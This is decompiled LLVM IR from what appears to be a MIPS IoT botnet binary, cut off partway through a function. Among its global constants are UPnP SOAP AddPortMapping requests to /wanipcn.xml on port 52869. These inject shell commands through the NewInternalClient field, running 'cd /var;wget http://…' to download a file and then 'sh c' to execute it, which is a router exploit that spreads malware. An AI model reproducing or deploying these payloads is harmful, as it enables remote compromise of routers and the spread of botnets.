source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%sysinfo = type { i32, [3 x i32], i32, i32, i32, i32, i32, i32, i16, i16, i32, i32, i32, [1 x i8] }
%sockaddr = type { i32, [14 x i8] }
%tms = type { i32, i32, i32, i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%timespec = type { i32, i32 }

@v0 = internal unnamed_addr global i32 0
@v1 = internal unnamed_addr global i32 0
@a0 = internal unnamed_addr global i32 0
@a1 = internal unnamed_addr global i32 0
@a2 = internal unnamed_addr global i32 0
@a3 = internal unnamed_addr global i32 0
@t1 = internal unnamed_addr global i32 0
@s0 = internal unnamed_addr global i32 0
@s1 = internal unnamed_addr global i32 0
@s2 = internal unnamed_addr global i32 0
@s3 = internal unnamed_addr global i32 0
@s4 = internal unnamed_addr global i32 0
@s5 = internal unnamed_addr global i32 0
@s6 = internal unnamed_addr global i32 0
@s7 = internal unnamed_addr global i32 0
@t9 = internal unnamed_addr global i32 0
@gp = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ra = internal unnamed_addr global i32 0
@global_var_4002bc.1 = global i32 268500991
@global_var_4045b0.3 = global i32 604569632
@global_var_449380.4 = global i32 4213616
@global_var_449454.5 = local_unnamed_addr global i32 4220288
@global_var_449348.6 = local_unnamed_addr global i32 4213808
@global_var_4493e4.7 = local_unnamed_addr global i32 4213904
@global_var_4492dc.8 = local_unnamed_addr global i32 4220048
@global_var_4491e8.9 = local_unnamed_addr global i32 4521984
@global_var_400514.10 = global i32 268500980
@global_var_449500.11 = local_unnamed_addr global i32 0
@global_var_449284.12 = local_unnamed_addr global i32 4219008
@global_var_4005f0.13 = global i32 -1883504624
@global_var_4493f0.14 = local_unnamed_addr global i32 4218816
@global_var_4006d0.15 = global i32 -1883504616
@global_var_400758.16 = global i32 -1883504616
@global_var_400000.17 = global i32 1179403647
@global_var_4491f0.18 = local_unnamed_addr global i32* @global_var_400000.17
@global_var_4007ec.19 = global i32 -1883504616
@global_var_44936c.20 = local_unnamed_addr global i32 4211620
@global_var_400808.21 = global i32 -1885208540
@global_var_449338.22 = local_unnamed_addr global i32 4195360
@global_var_400888.23 = global i32 -1883504616
@global_var_449458.24 = local_unnamed_addr global i32 4218320
@global_var_449504.25 = local_unnamed_addr global i32 0
@global_var_4492a8.26 = local_unnamed_addr global i32 4196644
@global_var_4493d8.27 = local_unnamed_addr global i32 4196540
@global_var_4009c8.28 = global i32 1008467973
@global_var_449354.29 = local_unnamed_addr global i32* @global_var_4009c8.28
@global_var_4492e4 = external local_unnamed_addr global i32
@global_var_4495b0.31 = global i32 0
@global_var_400a24.32 = global i32 -1883504624
@global_var_400a3c.33 = global i32 -1883504624
@global_var_4492e8.34 = local_unnamed_addr global i32* @global_var_4495b0.31
@global_var_400a5c.35 = global i32 -1883504624
@global_var_400a7c.36 = global i32 -1883504624
@global_var_400a9c.37 = global i32 -1883504624
@global_var_400abc.38 = global i32 136704
@global_var_449308 = external local_unnamed_addr global i32
@global_var_4013f0.40 = global i32 1008467973
@global_var_400af0.41 = global i32 -1883504624
@global_var_400b1c.42 = global i32 -1883504624
@global_var_400b48.43 = global i32 -1883504624
@global_var_400b6c.44 = global i32 -1883504624
@global_var_4492d0.45 = local_unnamed_addr global i32 4219408
@global_var_400ba8.46 = global i32 -1843265516
@global_var_400bcc.47 = global i32 1007026431
@global_var_44939c.48 = local_unnamed_addr global i32 4214496
@global_var_400c40.49 = global i32 -1883504624
@global_var_400c84.50 = global i32 -1883504624
@global_var_449300.51 = local_unnamed_addr global i32 4210996
@global_var_400ca8.52 = global i32 -1883504624
@global_var_449508.53 = global i32 0
@global_var_4492cc.54 = local_unnamed_addr global i32* @global_var_449508.53
@global_var_44950c.55 = global i32 0
@global_var_449394.56 = local_unnamed_addr global i32* @global_var_44950c.55
@global_var_4493a0.57 = local_unnamed_addr global i32 4217920
@global_var_4493a4.58 = local_unnamed_addr global i32 4198388
@global_var_449388.60 = local_unnamed_addr global i32 4198480
@global_var_408130.61 = global i32 1969760375
@global_var_408138.62 = global i32 1719085162
@global_var_408140.63 = global i32 2137139298
@global_var_408148.64 = global i32 1969760375
@global_var_408158.65 = global i32 1661413473
@global_var_408160.66 = global i32 1681080118
@global_var_408174.67 = global i32 1968137073
@global_var_408180.68 = global i32 1684824434
@global_var_40818c.69 = global i32 2138204514
@global_var_40819c.70 = global i32 1617257838
@global_var_4081a8.71 = global i32 1414747976
@global_var_4081b8.72 = global i32 1969513329
@global_var_4081c4.73 = global i32 1650882160
@global_var_4081d0.74 = global i32 1684235877
@global_var_4081e8.75 = global i32 1684235877
@global_var_40820c.76 = global i32 2000041069
@global_var_408224.77 = global i32 808283442
@global_var_408230.78 = global i32 1632330347
@global_var_40823c.79 = global i32 1684420192
@global_var_408254.80 = global i32 1717919798
@global_var_40826c.81 = constant [3 x i8] c"j)\00"
@global_var_408270.82 = global i32 1969760375
@global_var_408280.83 = global i32 1970168873
@global_var_408290.84 = global i32 1970168105
@global_var_4082a0.85 = global i32 1797737320
@global_var_401464.87 = global i32 -1883504624
@global_var_40147c.88 = global i32 -1883504624
@global_var_401494.89 = global i32 -1883504624
@global_var_4014ac.90 = global i32 -1883504624
@global_var_4014d4.91 = global i32 -1883504624
@global_var_4014ec.92 = global i32 604176386
@global_var_40152c.93 = global i32 -1883504624
@global_var_401544.94 = global i32 -1883504624
@global_var_40155c.95 = global i32 -1883504624
@global_var_401574.96 = global i32 -1883504624
@global_var_40158c.97 = global i32 -1883504624
@global_var_4015a4.98 = global i32 4231201
@global_var_40162c.99 = global i32 -1883504624
@global_var_401644.100 = global i32 604241919
@global_var_401730.101 = global i32 675414032
@global_var_401750.102 = global i32 -1883504624
@global_var_401770.103 = global i32 -1883504624
@global_var_40178c.104 = global i32 -1883504624
@global_var_4017a4.105 = global i32 -1883504624
@global_var_4017c0.106 = global i32 -1883504624
@global_var_4017d8.107 = global i32 -1883504624
@global_var_4017f0.108 = global i32 -1883504624
@global_var_401808.109 = global i32 -1883504624
@global_var_401824.110 = global i32 -1883504624
@global_var_40183c.111 = global i32 -1883504624
@global_var_401884.112 = global i32 -1883504624
@global_var_40189c.113 = global i32 -1883504624
@global_var_4018b4.114 = global i32 -1883504624
@global_var_4018cc.115 = global i32 -1883504624
@global_var_4018e4.116 = global i32 -1883504624
@global_var_4018fc.117 = global i32 -1883504624
@global_var_401914.118 = global i32 -1883504624
@global_var_40192c.119 = global i32 604241919
@global_var_40194c.120 = global i32 -1883504624
@global_var_401964.121 = global i32 -1883504624
@global_var_40197c.122 = global i32 -1883504624
@global_var_401994.123 = global i32 -1883504624
@global_var_4019ac.124 = global i32 -1883504624
@global_var_4019c4.125 = global i32 -1883504624
@global_var_4019dc.126 = global i32 -1883504624
@global_var_4019f4.127 = global i32 -1883504624
@global_var_401a10.128 = global i32 -1883504624
@global_var_401a28.129 = global i32 -1883504624
@global_var_401a40.130 = global i32 -1883504624
@global_var_401a58.131 = global i32 -1883504624
@global_var_401a70.132 = global i32 -1883504624
@global_var_401a88.133 = global i32 -1883504624
@global_var_401aa0.134 = global i32 -1883504624
@global_var_401ab8.135 = global i32 -1883504624
@global_var_401ad0.136 = global i32 -1883504624
@global_var_401aec.137 = global i32 -1883504624
@global_var_401b04.138 = global i32 -1883504624
@global_var_401b1c.139 = global i32 -1883504624
@global_var_401b34.140 = global i32 -1883504624
@global_var_401b50.141 = global i32 -1883504624
@global_var_401b68.142 = global i32 -1883504624
@global_var_401b84.143 = global i32 -1883504624
@global_var_401b9c.144 = global i32 -1883504624
@global_var_401bb4.145 = global i32 -1883504624
@global_var_401bf4.146 = global i32 -1883504624
@global_var_401c0c.147 = global i32 -1883504624
@global_var_401c30.148 = global i32 -1883504624
@global_var_401c48.149 = global i32 -1883504624
@global_var_401c60.150 = global i32 -1883504624
@global_var_401c78.151 = global i32 -1883504624
@global_var_401c90.152 = global i32 -1883504624
@global_var_401ca8.153 = global i32 1971712
@global_var_44928c.154 = local_unnamed_addr global i32 4213520
@global_var_449028.155 = local_unnamed_addr global i32 -1
@global_var_449518.156 = local_unnamed_addr global i32 0
@global_var_401dac.158 = global i32 -1883504616
@global_var_401de4.159 = global i32 -1883504616
@global_var_401e00.160 = global i32 -1883504616
@global_var_401e18.161 = global i32 1006764288
@global_var_401e50.162 = global i32 -1883504616
@global_var_401e78.163 = global i32 -1883504616
@global_var_401ed4.164 = global i32 608305153
@global_var_401ef4.165 = global i32 -1883504616
@global_var_401f0c.166 = global i32 -1883504616
@global_var_401f24.167 = global i32 -1883504616
@global_var_401f3c.168 = global i32 -1883504616
@global_var_401f58.169 = global i32 -1883504616
@global_var_449450.170 = local_unnamed_addr global i32 4214912
@global_var_4493a8.171 = local_unnamed_addr global i32 4205192
@global_var_449288.172 = local_unnamed_addr global i32 4198660
@global_var_4493c4.173 = local_unnamed_addr global i32 4211532
@global_var_449424.174 = local_unnamed_addr global i32 4212048
@global_var_408330.175 = global i32 110
@global_var_449390.176 = local_unnamed_addr global i32 4215104
@global_var_449344.177 = local_unnamed_addr global i32 4214288
@global_var_44932c.178 = local_unnamed_addr global i32 4197636
@global_var_449480.179 = local_unnamed_addr global i32 4198296
@global_var_4493e8.180 = local_unnamed_addr global i32 4215200
@global_var_408398.181 = global i32 10
@global_var_449404.182 = local_unnamed_addr global i32 4197964
@global_var_4493c0.183 = local_unnamed_addr global i32 4213424
@0 = global i32 47
@global_var_44948c.185 = local_unnamed_addr global i32 4212788
@global_var_449490 = external local_unnamed_addr global i32
@global_var_449570.187 = global i32 0
@global_var_4492a0.188 = local_unnamed_addr global i32 4214816
@global_var_4492f8 = external global i32
@global_var_405660.192 = global i32 684261384
@global_var_402318.193 = global i32 -1883504616
@global_var_449478.194 = local_unnamed_addr global i32 4211764
@global_var_449414.195 = local_unnamed_addr global i32 4204920
@global_var_44940c.196 = local_unnamed_addr global i32 4205012
@global_var_449468.197 = local_unnamed_addr global i32 4214160
@global_var_4492ec.198 = local_unnamed_addr global i32 4211664
@global_var_40839c.199 = constant [4 x i8] c"-sh\00"
@global_var_449428.200 = local_unnamed_addr global i32 4207200
@global_var_449024.201 = local_unnamed_addr global i32 -1
@global_var_4493fc.202 = local_unnamed_addr global i32 4196740
@global_var_402488.203 = global i32 -1883504616
@global_var_4493d4.204 = local_unnamed_addr global i32 4205368
@global_var_4024f0.205 = global i32 -1912302312
@global_var_449444.206 = local_unnamed_addr global i32 4217824
@global_var_4493cc.207 = local_unnamed_addr global i32 4216560
@global_var_449294.208 = local_unnamed_addr global i32 4213168
@global_var_4494a8.209 = local_unnamed_addr global i32 4216832
@global_var_402688.210 = global i32 -1883504616
@global_var_449420.211 = local_unnamed_addr global i32 4217472
@global_var_4083a0.212 = global i32 50921989
@global_var_449304.213 = local_unnamed_addr global i32 4217024
@global_var_4083a8.214 = global i32 84017921
@global_var_4027f0.215 = global i32 -1883504616
@global_var_4494ac.216 = local_unnamed_addr global i32 4217248
@global_var_4028d4.217 = global i32 268500691
@global_var_4028f0.218 = global i32 -1750728672
@global_var_4494c0.219 = local_unnamed_addr global i32 4195876
@global_var_44951c.220 = local_unnamed_addr global i32 0
@global_var_449528.221 = local_unnamed_addr global i32 0
@global_var_449520.222 = local_unnamed_addr global i32 0
@global_var_449524.223 = local_unnamed_addr global i32 0
@global_var_449340.224 = local_unnamed_addr global i32 4215008
@global_var_449484.225 = local_unnamed_addr global i32 4213712
@global_var_4492b0.226 = local_unnamed_addr global i32 4216304
@global_var_449324.227 = local_unnamed_addr global i32 4212692
@global_var_402d68.228 = global i32 -1883504616
@global_var_449440.229 = local_unnamed_addr global i32 4214688
@global_var_44944c.230 = local_unnamed_addr global i32 4217344
@global_var_403050.231 = global i32 -1883504616
@global_var_40306c.232 = global i32 -1883504616
@global_var_449530.233 = global i32 0
@global_var_44935c.234 = local_unnamed_addr global i32* @global_var_449530.233
@global_var_449368.235 = local_unnamed_addr global i32 4221068
@global_var_44956e.236 = local_unnamed_addr global i32 0
@global_var_44936e.237 = global i32 1772617792
@global_var_449376.238 = local_unnamed_addr global i32 1245708352
@global_var_44937e.239 = local_unnamed_addr global i32 1265631300
@global_var_44937f.240 = local_unnamed_addr global i32 1078685696
@global_var_403140.241 = global i32 -1883504624
@global_var_44937a.242 = local_unnamed_addr global i32 -1798569920
@global_var_449580.243 = global i32 0
@global_var_449582.244 = local_unnamed_addr global i32 0
@global_var_4031b0.245 = global i32 -1883504624
@global_var_4031f0.247 = global i32 -1883504624
@global_var_403208.248 = global i32 -1883504624
@global_var_403224.249 = global i32 -1883504624
@global_var_449594.250 = local_unnamed_addr global i32 0
@global_var_403248.251 = global i32 -1883504624
@global_var_44952c.252 = global i32 0
@global_var_4494bc.253 = local_unnamed_addr global i32* @global_var_44952c.252
@global_var_4493bc.254 = local_unnamed_addr global i32 4217696
@global_var_4033f4.255 = global i32 -1885765284
@global_var_403404.256 = global i32 -1883504616
@global_var_40346c.257 = global i32 -1816002299
@global_var_4494b0.258 = local_unnamed_addr global i32 4195024
@global_var_400328.260 = global i32 -1937178612
@global_var_44938c.261 = local_unnamed_addr global i32 4217568
@global_var_4492e0.262 = local_unnamed_addr global i32 4216272
@global_var_403a2c.264 = global i32 -1883504616
@global_var_403a48.265 = global i32 -1883504616
@global_var_403a74.266 = global i32 -1883504616
@global_var_403a90.267 = global i32 -1883504616
@global_var_403aac.268 = global i32 -1883504616
@global_var_403b6c.269 = global i32 -1883504616
@global_var_403c04.270 = global i32 -1885208536
@global_var_4083b0.271 = constant [619 x i8] c"POST /wanipcn.xml HTTP/1.1\0D\0AHost: 127.0.0.1:52869\0D\0AContent-Length: 590\0D\0AAccept-Encoding: gzip, deflate\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0AAccept: */*\0D\0AConnection: keep-alive\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;>c\00"
@global_var_44945c.272 = local_unnamed_addr global i32 4211568
@global_var_40861c.273 = constant [195 x i8] c"`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\0D\0A\0D\0A\00"
@global_var_4086e0.274 = constant [629 x i8] c"POST /wanipcn.xml HTTP/1.1\0D\0AHost: 127.0.0.1:52869\0D\0AContent-Length: 623\0D\0AAccept-Encoding: gzip, deflate\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0AAccept: */*\0D\0AConnection: keep-alive\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;wget http://\00"
@global_var_408958.275 = constant [11 x i8] c"/b -O -> c\00"
@global_var_403e08.276 = global i32 -1883504616
@global_var_408964.277 = constant [621 x i8] c"POST /wanipcn.xml HTTP/1.1\0D\0AHost: 127.0.0.1:52869\0D\0AContent-Length: 592\0D\0AAccept-Encoding: gzip, deflate\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0AAccept: */*\0D\0AConnection: keep-alive\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;sh c\00"
@global_var_403f5c.278 = global i32 -1883504616
@global_var_403fc0.279 = global i32 -1883504616
@global_var_403ff0.280 = global i32 -1883504616
@global_var_40400c.281 = global i32 -1883504616
@global_var_404038.282 = global i32 -1883504616
@global_var_404054.283 = global i32 -1883504616
@global_var_40409c.284 = global i32 -1883504616
@global_var_449534.285 = global i32 0
@global_var_44941c.286 = local_unnamed_addr global i32* @global_var_449534.285
@global_var_404168.287 = global i32 -1883504616
@global_var_4041a0.288 = global i32 -1883504616
@global_var_404220.289 = global i32 -1883504616
@global_var_404244.290 = global i32 1006881996
@global_var_404278.291 = global i32 268500937
@global_var_449408.292 = local_unnamed_addr global i32 4216640
@global_var_4042b8.293 = global i32 -1883504616
@global_var_44930c.294 = local_unnamed_addr global i32* @global_var_4013f0.40
@global_var_4042d0.295 = global i32 -1883504616
@global_var_4493b8.296 = local_unnamed_addr global i32 4206760
@global_var_4042e8.297 = global i32 -1883504616
@global_var_4492b8.298 = local_unnamed_addr global i32 4210964
@global_var_404300.299 = global i32 -1883504616
@global_var_40431c.300 = global i32 -1883504616
@global_var_404334.301 = global i32 -1883307828
@global_var_449280.302 = local_unnamed_addr global i32 4216928
@global_var_449378.303 = local_unnamed_addr global i32 4213312
@global_var_4491f4.304 = local_unnamed_addr global i32 4214000
@global_var_404de4.305 = global i32 -1881407472
@global_var_40688c.306 = global i32 65011720
@global_var_406884.308 = global i32 65011720
@global_var_405280.309 = global i32 -1883504624
@global_var_4491f8.312 = local_unnamed_addr global i32 4213520
@global_var_4492f0.313 = local_unnamed_addr global i32 4222640
@global_var_4491fc.314 = local_unnamed_addr global i32 4213168
@global_var_449498.316 = local_unnamed_addr global i32 4222784
@global_var_449590.317 = global i32 0
@global_var_4492ac.318 = local_unnamed_addr global i32* @global_var_449590.317
@global_var_4493b4.319 = local_unnamed_addr global i32 4224400
@global_var_4492c4.320 = local_unnamed_addr global i32 4226208
@global_var_449400.321 = local_unnamed_addr global i32 4218216
@global_var_449364.322 = local_unnamed_addr global i32 4218176
@global_var_4495c0.323 = global i32 0
@global_var_449200.324 = local_unnamed_addr global i32* @global_var_4495c0.323
@global_var_4494b4.325 = local_unnamed_addr global i32 4222224
@global_var_449540.326 = global i32 0
@global_var_449448.327 = local_unnamed_addr global i32* @global_var_449540.326
@global_var_449158.328 = global i32 256
@global_var_449170.329 = global i32* @global_var_449158.328
@global_var_449430.330 = local_unnamed_addr global i32** @global_var_449170.329
@global_var_449578.331 = global i32 0
@global_var_4492f4.332 = local_unnamed_addr global i32* @global_var_449578.331
@global_var_4492f9.333 = global i32 268453012
@global_var_449640.334 = global i32 0
@global_var_449318.335 = local_unnamed_addr global i32* @global_var_449640.334
@global_var_449488.336 = local_unnamed_addr global i32 4224096
@global_var_449470.337 = local_unnamed_addr global i32 4219672
@global_var_405f98.338 = global i32 604176396
@global_var_406034.339 = global i32 -1883504624
@global_var_4061c4.341 = global i32 -1883504624
@global_var_4063c4.342 = global i32 268435483
@global_var_40640c.343 = global i32 -1883504624
@global_var_406434.344 = global i32 -1883504624
@global_var_406464.345 = global i32 -1883504624
@global_var_40650c.349 = global i32 -1883504624
@global_var_4494a4.350 = local_unnamed_addr global i32 4220864
@global_var_449310.351 = local_unnamed_addr global i32 0
@global_var_449330.352 = local_unnamed_addr global i32 4222560
@global_var_4065e8.353 = global i32 -1883504624
@global_var_4493d0.354 = local_unnamed_addr global i32 4224240
@global_var_406608.355 = global i32 -1883504624
@global_var_406624.356 = global i32 -1883504624
@global_var_40665c.357 = global i32 -1883504624
@global_var_406678.358 = global i32 -1883504624
@global_var_406694.359 = global i32 -1883504624
@global_var_4066b4.360 = global i32 -1883504624
@global_var_4493f8.361 = local_unnamed_addr global i32 4224000
@global_var_4066e4.362 = global i32 -1883504624
@global_var_4066fc.363 = global i32 -1883504624
@global_var_40671c.364 = global i32 -1883504624
@global_var_40673c.365 = global i32 -1883504624
@global_var_406764.366 = global i32 -1883504624
@global_var_44920c = external local_unnamed_addr global i32
@global_var_406804.367 = global i32 -1883504624
@global_var_406844.368 = global i32 -1883504624
@global_var_449214.369 = local_unnamed_addr global i32* @global_var_449580.243
@global_var_408bd4.370 = constant [10 x i8] c"/dev/null\00"
@global_var_449334.371 = local_unnamed_addr global i32 4226496
@global_var_449584.372 = local_unnamed_addr global i32 0
@global_var_4493ac.373 = local_unnamed_addr global i32 0
@global_var_4492d8.374 = local_unnamed_addr global i32 0
@global_var_449494.375 = local_unnamed_addr global i32* @global_var_449570.187
@global_var_449574.376 = global i32 0
@global_var_44942c.377 = local_unnamed_addr global i32* @global_var_449574.376
@global_var_407830.379 = global i32 684195848
@global_var_4492c8.380 = local_unnamed_addr global i32 4226928
@global_var_449218.381 = local_unnamed_addr global i32 4221212
@global_var_4492b4.382 = local_unnamed_addr global i32 4223728
@global_var_4492d4.383 = local_unnamed_addr global i32 4223536
@global_var_449418.384 = local_unnamed_addr global i32 4223632
@global_var_449374.385 = local_unnamed_addr global i32 4223440
@global_var_406ba8.386 = global i32 604241921
@global_var_406bb8.387 = global i32 906297346
@global_var_406bc8.388 = global i32 -1883504624
@global_var_406c1c.389 = global i32 -1883504624
@global_var_406c3c.390 = global i32 -1883504624
@global_var_406c78.391 = global i32 -1883504624
@global_var_449328.392 = local_unnamed_addr global i32 0
@global_var_406cf0.393 = global i32 -1883504624
@global_var_449220.394 = local_unnamed_addr global i32 4220048
@global_var_406d60.395 = global i32 -1912405880
@global_var_449350.396 = local_unnamed_addr global i32 4222464
@global_var_406d9c.397 = global i32 -1883504624
@global_var_406dc8.398 = global i32 -1885142960
@global_var_406ef8.399 = global i32 -1883504624
@global_var_44934c.400 = local_unnamed_addr global i32 4224784
@global_var_406f20.401 = global i32 -1883504624
@global_var_4492c0.402 = local_unnamed_addr global i32 4222976
@global_var_406fac.403 = global i32 -1883504624
@global_var_4493b0.404 = local_unnamed_addr global i32 4225392
@global_var_4070ec.405 = global i32 -1881407464
@global_var_407164.406 = global i32 -1778253808
@global_var_4493e0.407 = local_unnamed_addr global i32 4226976
@global_var_4074c8.408 = global i32 -1883504624
@global_var_408be0.409 = global i32 -300820
@global_var_408d00.410 = global i32 33554944
@global_var_4491d4.411 = global i32* @global_var_408d00.410
@global_var_4494b8.412 = local_unnamed_addr global i32** @global_var_4491d4.411
@global_var_4491b0.413 = global i32 0
@global_var_4495a0.414 = local_unnamed_addr global i32 0
@global_var_4492a4.415 = local_unnamed_addr global i32 4227088
@global_var_407ee0.416 = global i32 -1883504624
@global_var_407f60.417 = global i32 16711693
@global_var_4494cc.418 = global i32 0
@global_var_44937c.419 = local_unnamed_addr global i32* @global_var_4494cc.418
@global_var_449224.420 = local_unnamed_addr global i32 4213712
@global_var_449228.421 = local_unnamed_addr global i32 4213904
@global_var_4080a8.422 = global i32 -1910964224
@global_var_408114.423 = global i32 -1883504624
@global_var_449514.157 = local_unnamed_addr global i8 0
@global_var_449384.246 = local_unnamed_addr global i16 22848
@global_var_4082b8.184 = global [2 x i8] c"/\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

define i32 @entry_point(i32 %arg1) local_unnamed_addr {
entry:
  %v1_400274 = load i32, i32* @ra, align 4
  %v1_4002ac = add i32 %v1_400274, 299268
  %v2_4002ac = inttoptr i32 %v1_4002ac to i32*
  %v3_4002ac = load i32, i32* %v2_4002ac, align 4
  call void @__pseudo_call(i32 %v3_4002ac)
  %v0_4002cc = load i32, i32* @v0, align 4
  ret i32 %v0_4002cc
}

define i32 @function_4002d0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4002d0:
  %v0_4002d8.pre = load i32, i32* @a0, align 4
  %v0_4002dc.pre = load i32, i32* @a1, align 4
  br label %dec_label_pc_4002d8

dec_label_pc_4002d8:                              ; preds = %dec_label_pc_4002d8, %dec_label_pc_4002d0
  %v0_4002e4 = phi i32 [ %v2_4002e4, %dec_label_pc_4002d8 ], [ 0, %dec_label_pc_4002d0 ]
  %v0_4002dc = phi i32 [ %v1_4002dc, %dec_label_pc_4002d8 ], [ %v0_4002dc.pre, %dec_label_pc_4002d0 ]
  %v0_4002e0 = phi i32 [ %v1_4002e0, %dec_label_pc_4002d8 ], [ %v0_4002d8.pre, %dec_label_pc_4002d0 ]
  %v1_4002d8 = inttoptr i32 %v0_4002e0 to i16*
  %v2_4002d8 = load i16, i16* %v1_4002d8, align 2
  %v3_4002d8 = zext i16 %v2_4002d8 to i32
  %v1_4002dc = add i32 %v0_4002dc, -2
  %v1_4002e0 = add i32 %v0_4002e0, 2
  %v2_4002e4 = add i32 %v3_4002d8, %v0_4002e4
  %v1_4002e8 = icmp ult i32 %v1_4002dc, 2
  %v1_4002ec = icmp eq i1 %v1_4002e8, false
  br i1 %v1_4002ec, label %dec_label_pc_4002d8, label %dec_label_pc_4002f0

dec_label_pc_4002f0:                              ; preds = %dec_label_pc_4002d8
  %v2_4002f4 = icmp eq i32 %v1_4002dc, 1
  br i1 %v2_4002f4, label %dec_label_pc_4002f8, label %dec_label_pc_40030c

dec_label_pc_4002f8:                              ; preds = %dec_label_pc_4002f0
  %v1_4002fc = inttoptr i32 %v1_4002e0 to i8*
  %v2_4002fc = load i8, i8* %v1_4002fc, align 1
  %v3_4002fc = sext i8 %v2_4002fc to i32
  %v2_400304 = add i32 %v3_4002fc, %v2_4002e4
  br label %dec_label_pc_40030c

dec_label_pc_40030c:                              ; preds = %dec_label_pc_4002f0, %dec_label_pc_4002f8
  %v0_40030c = phi i32 [ %v2_4002e4, %dec_label_pc_4002f0 ], [ %v2_400304, %dec_label_pc_4002f8 ]
  %v1_400310.in = phi i32 [ %v2_4002e4, %dec_label_pc_4002f0 ], [ %v2_400304, %dec_label_pc_4002f8 ]
  %v1_400310 = urem i32 %v1_400310.in, 65536
  %v1_40030c = udiv i32 %v0_40030c, 65536
  %v2_400310 = add nuw nsw i32 %v1_40030c, %v1_400310
  %v1_400314 = udiv i32 %v2_400310, 65536
  %v2_400318 = add nuw nsw i32 %v1_400314, %v2_400310
  %v1_40031c = urem i32 %v2_400318, 65536
  %v2_400320 = xor i32 %v1_40031c, 65535
  ret i32 %v2_400320

; uselistorder directives
  uselistorder i32 %v2_400310, { 1, 0 }
  uselistorder i32 %v2_4002e4, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_40030c, { 1, 0 }
}

define i32 @function_400328(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_400328:
  %v1_40032c = add i32 %arg1, 16
  %v2_40032c = inttoptr i32 %v1_40032c to i32*
  %v3_40032c = load i32, i32* %v2_40032c, align 4
  %v0_40033c.pre = load i32, i32* @a1, align 4
  %v0_400340.pre = load i32, i32* @a3, align 4
  br label %dec_label_pc_40033c

dec_label_pc_40033c:                              ; preds = %dec_label_pc_40033c, %dec_label_pc_400328
  %v0_400348 = phi i32 [ %v2_400348, %dec_label_pc_40033c ], [ 0, %dec_label_pc_400328 ]
  %v0_400340 = phi i32 [ %v1_400340, %dec_label_pc_40033c ], [ %v0_400340.pre, %dec_label_pc_400328 ]
  %v0_400344 = phi i32 [ %v1_400344, %dec_label_pc_40033c ], [ %v0_40033c.pre, %dec_label_pc_400328 ]
  %v1_40033c = inttoptr i32 %v0_400344 to i16*
  %v2_40033c = load i16, i16* %v1_40033c, align 2
  %v3_40033c = zext i16 %v2_40033c to i32
  %v1_400340 = add i32 %v0_400340, -2
  %v1_400344 = add i32 %v0_400344, 2
  %v2_400348 = add i32 %v3_40033c, %v0_400348
  %v1_40034c = icmp slt i32 %v1_400340, 2
  %v1_400350 = icmp eq i1 %v1_40034c, false
  br i1 %v1_400350, label %dec_label_pc_40033c, label %dec_label_pc_400354

dec_label_pc_400354:                              ; preds = %dec_label_pc_40033c
  %v2_400358 = icmp eq i32 %v1_400340, 1
  br i1 %v2_400358, label %dec_label_pc_40035c, label %dec_label_pc_40036c

dec_label_pc_40035c:                              ; preds = %dec_label_pc_400354
  %v1_400360 = inttoptr i32 %v1_400344 to i8*
  %v2_400360 = load i8, i8* %v1_400360, align 1
  %v3_400360 = zext i8 %v2_400360 to i32
  %v2_400368 = add i32 %v3_400360, %v2_400348
  br label %dec_label_pc_40036c

dec_label_pc_40036c:                              ; preds = %dec_label_pc_400354, %dec_label_pc_40035c
  %v0_400380 = phi i32 [ %v2_400348, %dec_label_pc_400354 ], [ %v2_400368, %dec_label_pc_40035c ]
  %v1_40036c = add i32 %arg1, 9
  %v2_40036c = inttoptr i32 %v1_40036c to i8*
  %v3_40036c = load i8, i8* %v2_40036c, align 1
  %v4_40036c = zext i8 %v3_40036c to i32
  %v1_40037c = udiv i32 %v3_40032c, 65536
  %v2_400380 = add i32 %v0_400380, %v1_40037c
  %v1_400388 = mul nuw nsw i32 %v4_40036c, 256
  %v2_40038c = add i32 %v2_400380, %v1_400388
  br label %dec_label_pc_40039c

dec_label_pc_40039c:                              ; preds = %dec_label_pc_40039c, %dec_label_pc_40036c
